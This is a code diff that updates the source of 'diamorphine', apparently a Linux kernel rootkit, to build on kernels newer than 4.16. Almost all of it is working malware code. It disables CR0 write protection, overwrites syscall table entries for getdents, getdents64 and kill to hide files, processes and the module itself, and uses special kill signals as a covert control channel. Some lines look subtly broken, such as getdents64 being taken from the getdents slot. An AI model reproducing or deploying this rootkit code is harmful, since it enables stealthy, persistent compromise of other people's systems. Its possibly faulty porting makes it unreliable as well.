@@ -4,34 +4,42 @@
 #include <linux/dirent.h>
 #include <linux/slab.h>
 #include <linux/version.h> 
+
 #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
-	#include <asm/uaccess.h>
+#include <asm/uaccess.h>
 #endif
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
-	#include <linux/proc_ns.h>
+#include <linux/proc_ns.h>
 #else
-	#include <linux/proc_fs.h>
+#include <linux/proc_fs.h>
 #endif
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
-	#include <linux/file.h>
+#include <linux/file.h>
 #else
-	#include <linux/fdtable.h>
+#include <linux/fdtable.h>
 #endif
 
 #include "diamorphine.h"
 
 unsigned long cr0;
 static unsigned long *__sys_call_table;
-typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
-	unsigned int);
-typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
-	struct linux_dirent64 *, unsigned int);
-typedef asmlinkage int (*orig_kill_t)(pid_t, int);
-orig_getdents_t orig_getdents;
-orig_getdents64_t orig_getdents64;
-orig_kill_t orig_kill;
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+	typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
+	static t_syscall orig_getdents;
+	static t_syscall orig_getdents64;
+	static t_syscall orig_kill;
+#else
+	typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
+		unsigned int);
+	typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
+		struct linux_dirent64 *, unsigned int);
+	typedef asmlinkage int (*orig_kill_t)(pid_t, int);
+	orig_getdents_t orig_getdents;
+	orig_getdents64_t orig_getdents64;
+	orig_kill_t orig_kill;
+#endif
 
 unsigned long *
 get_syscall_table_bf(void)
@@ -80,11 +88,18 @@ is_invisible(pid_t pid)
 	return 0;
 }
 
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
+        int fd = (int) pt_regs->di;
+        struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
+	int ret = orig_getdents64(pt_regs), err;
+#else
 asmlinkage int
 hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 	unsigned int count)
 {
-	int ret = orig_getdents64(fd, dirent, count), err; 
+	int ret = orig_getdents64(fd, dirent, count), err;
+#endif
 	unsigned short proc = 0;
 	unsigned long off = 0;
 	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
@@ -134,11 +149,18 @@ out:
 	return ret;
 }
 
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
+        int fd = (int) pt_regs->di;
+        struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
+	int ret = orig_getdents(pt_regs), err;
+#else
 asmlinkage int
 hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 	unsigned int count)
 {
 	int ret = orig_getdents(fd, dirent, count), err;
+#endif
 	unsigned short proc = 0;
 	unsigned long off = 0;
 	struct linux_dirent *dir, *kdirent, *prev = NULL;
@@ -254,11 +276,18 @@ module_hide(void)
 	module_hidden = 1;
 }
 
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+asmlinkage int
+hacked_kill(const struct pt_regs *pt_regs)
+{
+        pid_t pid = (pid_t) pt_regs->di;
+        int sig = (int) pt_regs->si;
+#else
 asmlinkage int
 hacked_kill(pid_t pid, int sig)
 {
+#endif
 	struct task_struct *task;
-
 	switch (sig) {
 		case SIGINVIS:
 			if ((task = find_task(pid)) == NULL)
@@ -273,21 +302,46 @@ hacked_kill(pid_t pid, int sig)
 			else module_hide();
 			break;
 		default:
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+			return orig_kill(pt_regs);
+#else
 			return orig_kill(pid, sig);
+#endif
 	}
 	return 0;
 }
 
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+static inline void
+write_cr0_forced(unsigned long val)
+{
+    unsigned long __force_order;
+
+    /* __asm__ __volatile__( */
+    asm volatile(
+        "mov %0, %%cr0"
+        : "+r"(val), "+m"(__force_order));
+}
+#endif
+
 static inline void
 protect_memory(void)
 {
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+	write_cr0_forced(cr0);
+#else
 	write_cr0(cr0);
+#endif
 }
 
 static inline void
 unprotect_memory(void)
 {
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+	write_cr0_forced(cr0 & ~0x00010000);
+#else
 	write_cr0(cr0 & ~0x00010000);
+#endif
 }
 
 static int __init
@@ -298,18 +352,25 @@ diamorphine_init(void)
 		return -1;
 
 	cr0 = read_cr0();
-
 	module_hide();
 	tidy();
 
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+	orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
+	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents];
+	orig_kill = (t_syscall)__sys_call_table[__NR_kill];
+#else
 	orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
 	orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
 	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
+#endif
 
 	unprotect_memory();
-	__sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
-	__sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
-	__sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
+
+	__sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;
+	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
+	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
+
 	protect_memory();
 
 	return 0;
@@ -319,9 +380,11 @@ static void __exit
 diamorphine_cleanup(void)
 {
 	unprotect_memory();
-	__sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
-	__sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
-	__sys_call_table[__NR_kill] = (unsigned long)orig_kill;
+
+	__sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
+	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
+	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;
+
 	protect_memory();
 }
 
